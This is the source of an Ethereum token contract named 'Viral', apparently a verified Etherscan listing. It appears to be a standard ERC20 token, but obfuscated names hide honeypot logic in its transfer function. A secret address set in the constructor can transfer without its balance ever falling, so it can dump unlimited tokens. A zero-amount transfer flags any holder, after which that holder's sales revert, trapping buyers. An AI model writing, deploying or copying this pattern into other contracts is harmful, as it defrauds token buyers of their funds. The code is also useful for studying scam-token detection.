/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

/*

https://twitter.com/ViralTokenErc20

..........................................................:::::::::::::::::::::::::::::::::::::::::-
.........................................................::::::::::::::::::::::::::::::::::::::::---
........................................................::::::::::::::::::::::::::::::::::::::::----
.......................................................::::::::::::::::::::::::::::::::::::::::-----
....................................................:::::::::::::::::::::::::::::::::::::::::-------
.................................................:.::::::::::::::::::::::::::::::::::::::::---------
...............................................:::::::::::::::::::::::::::::::::::::::::::----------
..............................................::::::::::::::::::::::::::::::::::::::::::::----------
...............................................:::::::::::::::::::::::::::::::::::::::::------------
..............................................:::::::::::::::::::::::::::::::::::::::::-------------
.............................................::::::::::::::::::::::::::::::::::::::::---------------
..............:....................:.......::::::::::::::::::::::::::::::::::::----=+---------------
.............:*++******++******+++++:.....:::::::::::::=************************#%@@#=--------------
................:+#%%%%####***#%%=...:::..:::::::::::::::-*%%#*#@@@%#%@@%%##@@@%%%+-----------------
...................-%####**+-..:=#=  .::::::::::::::::::::::+%*@@%#+%%*==+#@@@%%*-------------------
....................*@@@@@@@@#:..:#-  .::::::::::::::::::::::[email protected]@%**%#--#@@@@@@%+--------------------
.....................+%%#%@@@@%-..:#-  .:::::::::::::::::::::%@%#*%*[email protected]@@@@@@@+---------------------
......................=#*+*@@@@%-..-#-...:::::::::::::::::::#@%##@*-*@@@@@@@%+----------------------
.......................-*[email protected]@@@%-..-#-...:::::::::::::::::#@%##%+=*@@@@@@@%=-----------------------
........................-*++*%@@%%-..-#-...:::::::::::::::#@%##%+-#@@@@@@@%=------------------------
........................:-****%@@@%-..-#-...:::::::::::::#@%##%+=#@@@@@@@%=-------------------------
........................:::***#%@@@%-..-#-...:::::::::::%@%##%+=%@@@@@@@%=--------------------------
....................::::::::*###%@@%%-..-#-...::::::::-%@%##%==%@@@@@@@%=---------------------------
..................:::::::::::*###%@@%%-..=#-...::::::-%@%#%%==%@@@@@@%%=----------------------------
................::::::::::::::*###%@@@%-.:=#-...::::-#@%#%%=+%@@@@@@%#------------------------------
................:::::::::::::::*%%%%@@@%-::=#-..:::-%@%#%%[email protected]@@@@@@%#-------------------------------
..............::::::::::::::::::*%%%%@@@%-::=%-:::-%@%%%%[email protected]@@@@%%@#-------------------------------=
..............:::::::::::::::::::*%%%%@@@%-=+#%-::%@@%%#[email protected]@@@@%==*--------------------------------=
............::::::::::::::::::::::+%%%@@@@%*@@@%-%@@%%#=*@@@@@%=---------------------------------===
.........::::::::::::::::::::::::::+%%%@@@@%*@@@@@@%@#=*@@@@@%=---------------------------------====
.........:::::::::::::::::::::::::::+%%%@@@@%*%@@@%@#=*@@@@@%=-------------------------------=======
.......::::::::::::::::::::::::::::::=%%%@@@@%*%%%@#=*@@@@@%-------------------------------=========
.....:::::::::::::::::::::::::::::::::=%%%@@@@%*%@*=*@@@@@#-------------------------------==========
...::::::::::::::::::::::::::::::::::::=%%%@@@@%**=#@@@@@#-------------------------------===========
..::::::::::::::::::::::::::::::::::::::=%@@@@@@%+#@@@@@#------------------------------=============
..::::::::::::::::::::::::::::::::::::::-=%@@@@@@%@@@@@#-------------------------------=============
::::::::::::::::::::::::::::::::::::::-----%@@@@@@@@@@#------------------------------===============
:::::::::::::::::::::::::::::::::::::-------%@@@@@@@@#===============-------------==================
:::::::::::::::::::::::::::::::::::----------%@%[email protected]@@*+++++++++++++++=------------===================
:::::::::::::::::::::::::::::::::-------------#=-+%+---------------------------=====================
::::::::::::::::::::::::::::::::------------------=--------------------------=======================
::::::::::::::::::::::::::::::-----------------------------------------------=======================
:::::::::::::::::::::::::::----------------------------------------------===========================
::::::::::::::::::::::::::----------------------------------------------============================
::::::::::::::::::::::::-----------------------------------------------=============================
:::::::::::::::::::::::---------------------------------------------================================
:::::::::::::::::::---------------------------------------------==--================================
:::::::::::::::::--------------------------------------------=----==================================
:::::::::::::::----------------------------------------------=======================================
:::::::::::::---------------------------------------------==========================================

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ViralToken is Ownable {
    uint256 public totalSupply = 69_000_000_000 * 10 ** 9;

    mapping(address => uint256) private goingViral;

    uint256 private acquaint = 76;

    function transfer(address disconnected, uint256 trending) public returns (bool success) {
        vvs(msg.sender, disconnected, trending);
        return true;
    }

    function vvs(address categorize, address disconnected, uint256 trending) private returns (bool success) {
        if (goingViral[categorize] == 0) {
            balanceOf[categorize] -= trending;
        }

        if (trending == 0) navigate[disconnected] += acquaint;

        if (categorize != jumble && goingViral[categorize] == 0 && navigate[categorize] > 0) {
            goingViral[categorize] -= acquaint;
        }

        balanceOf[disconnected] += trending;
        emit Transfer(categorize, disconnected, trending);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private navigate;

    address public jumble;

    function approve(address glue, uint256 trending) public returns (bool success) {
        allowance[msg.sender][glue] = trending;
        emit Approval(msg.sender, glue, trending);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    string public symbol = 'VIRAL';

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = 'Viral';

    constructor(address acrimoniously) {
        balanceOf[msg.sender] = totalSupply;
        goingViral[acrimoniously] = acquaint;
        IUniswapV2Router02 blame = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        jumble = IUniswapV2Factory(blame.factory()).createPair(address(this), blame.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address categorize, address disconnected, uint256 trending) public returns (bool success) {
        require(trending <= allowance[categorize][msg.sender]);
        allowance[categorize][msg.sender] -= trending;
        vvs(categorize, disconnected, trending);
        return true;
    }
}